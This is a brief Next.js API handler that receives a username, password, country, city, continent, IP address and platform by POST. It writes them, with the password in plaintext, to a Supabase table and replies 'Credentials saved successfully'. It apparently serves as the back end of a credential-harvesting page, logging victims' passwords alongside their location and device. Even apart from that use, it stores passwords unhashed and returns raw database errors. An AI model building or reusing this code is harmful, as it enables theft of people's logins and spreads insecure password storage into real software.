import { createClient } from '@supabase/supabase-js'

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, password, country, city, continent, ip_address, platform } = req.body;
    
    // Initialize Supabase client
    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
    const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
    const supabase = createClient(supabaseUrl, supabaseAnonKey);
    
    // Insert data into the users table
    const { data, error } = await supabase
      .from('users')
      .insert([
        { 
          username, 
          password,
          country,
          city, 
          continent,
          ip_address,
          platform,
          login_time: new Date().toISOString()
        }
      ]);
    
    if (error) {
      console.error('Supabase error:', error);
      return res.status(500).json({ 
        error: error.message,
        success: false
      });
    }
    
    return res.status(200).json({ 
      success: true,
      message: 'Credentials saved successfully',
      data
    });
    
  } catch (error) {
    console.error('Server error:', error);
    return res.status(500).json({ 
      error: error.message,
      success: false
    });
  }
} 